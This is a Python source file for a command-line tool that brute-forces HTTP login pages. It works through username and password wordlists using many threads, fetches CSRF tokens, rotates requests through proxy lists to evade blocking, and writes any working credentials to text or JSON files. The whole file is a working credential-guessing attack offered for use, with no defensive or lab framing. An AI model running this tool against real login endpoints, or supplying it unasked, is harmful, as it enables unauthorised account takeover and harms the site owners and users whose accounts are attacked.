import argparse
import requests
import json
import time
import random
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from tqdm import tqdm

# function that loads the proxies from an external list
def load_proxies(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]

# function that attempts to find and track the page in which the crsf token is located, makes the brute forcing more “sophisticated”
def get_csrf_token(csrf_url, token_name, headers=None):
    try:
        r = requests.get(csrf_url, headers=headers, timeout=8)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find("input", {"name": token_name})
        return token['value'] if token else ""
    except Exception:
        return ""

# main function that attempts logins in the page using potential parameters like extra data, the crsf token if detected, if json is used, etc.
def attempt_login(url, user_field, pass_field, username, password, fail_string, extra_data, headers, delay, use_json, proxies, csrf_url, csrf_field):
    data = {user_field: username, pass_field: password}
    if extra_data:
        data.update(extra_data)
    if csrf_url and csrf_field:
        token = get_csrf_token(csrf_url, csrf_field, headers)
        if token:
            data[csrf_field] = token
    if use_json:
        payload = json.dumps(data)
        headers = headers.copy()
        headers["Content-Type"] = "application/json"
    else:
        payload = data
    try:
        proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
        resp = requests.post(url, data=payload if not use_json else None, json=data if use_json else None,
                             headers=headers, timeout=8, allow_redirects=True, proxies=proxy)
        if fail_string.lower() not in resp.text.lower() and resp.status_code == 200:
            return (username, password)
    except Exception:
        pass
    if delay > 0:
        time.sleep(delay)
    return None

# the function that makes the brute force part, using threads(and proxies if user asks) to concurrently use the previous function
def brute_force(url, userlist, passlist, user_field, pass_field, fail_string, threads, extra_data, headers,
                delay, use_json, proxy_list, csrf_url, csrf_field, lockout_threshold):
    with open(userlist) as ufile:
        usernames = [u.strip() for u in ufile if u.strip()]
    with open(passlist) as pfile:
        passwords = [p.strip() for p in pfile if p.strip()]

    proxies = load_proxies(proxy_list) if proxy_list else []
    failures = {}

    print(f"|*| Brute-forcing {len(usernames)} usernames × {len(passwords)} passwords...")

    found = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                if failures.get(username, 0) >= lockout_threshold:
                    print(f"|!| Skipping {username} due to lockout threshold")
                    continue
                futures.append(
                    executor.submit(
                        attempt_login, url, user_field, pass_field,
                        username, password, fail_string, extra_data, headers,
                        delay, use_json, proxies, csrf_url, csrf_field
                    )
                )
        for fut in tqdm(as_completed(futures), total=len(futures), desc="Brute Forcing"):
            result = fut.result()
            if result:
                user, pw = result
                print(f"|+| VALID: {user} / {pw}")
                found.append((user, pw))
            else:
                if 'username' in locals():
                    failures[username] = failures.get(username, 0) + 1
    return found

#arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="HTTP(s) Login Page Brute Forcer")
    parser.add_argument("url", help="Login page POST endpoint (e.g., http://target/login)")
    parser.add_argument("userlist", help="Username wordlist file")
    parser.add_argument("passlist", help="Password wordlist file")
    parser.add_argument("--user-field", default="username", help="Username form field name")
    parser.add_argument("--pass-field", default="password", help="Password form field name")
    parser.add_argument("--fail-string", default="invalid", help="Keyword indicating failed login in response")
    parser.add_argument("--extra-data", nargs="*", help="Additional form key=val items", default=[])
    parser.add_argument("--header", nargs="*", help="Extra headers as Key:Value", default=[])
    parser.add_argument("--delay", type=float, default=0, help="Delay between each request (seconds)")
    parser.add_argument("--json", action="store_true", help="Send payload as JSON instead of form data")
    parser.add_argument("--proxy-list", help="File with list of proxies (http://IP:PORT)")
    parser.add_argument("--csrf-url", help="URL to fetch CSRF token")
    parser.add_argument("--csrf-field", help="Name of CSRF token field")
    parser.add_argument("--lockout-threshold", type=int, default=5, help="Max failed attempts per user before skipping")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Concurrency (default: 20)")
    parser.add_argument("-o", "--output", type=Path, help="File for valid credentials")
    parser.add_argument("--json-output", type=Path, help="Save credentials as JSON")
    args = parser.parse_args()

# for extra data and headers, converting it into python’s key value concept
    extra_form = {}
    for item in args.extra_data:
        if '=' in item:
            k,v = item.split('=', 1)
            extra_form[k] = v
    headers = {}
    for item in args.header:
        if ':' in item:
            k,v = item.split(':', 1)
            headers[k.strip()] = v.strip()

    valid = brute_force(
        args.url, args.userlist, args.passlist,
        args.user_field, args.pass_field, args.fail_string,
        args.threads, extra_form, headers, args.delay,
        args.json, args.proxy_list, args.csrf_url, args.csrf_field,
        args.lockout_threshold
    )

    print(f"\n|*| Done. Found {len(valid)} valid credential(s).")
    if args.output and valid:
        args.output.write_text('\n'.join([f'{u}:{p}' for u,p in valid]))
        print(f"|+| Credentials saved to {args.output}")
    if args.json_output and valid:
        args.json_output.write_text(json.dumps([
            {"username": u, "password": p} for u, p in valid
        ], indent=2))
        print(f"|+| JSON saved to {args.json_output}")

if __name__ == "__main__":
    cli()
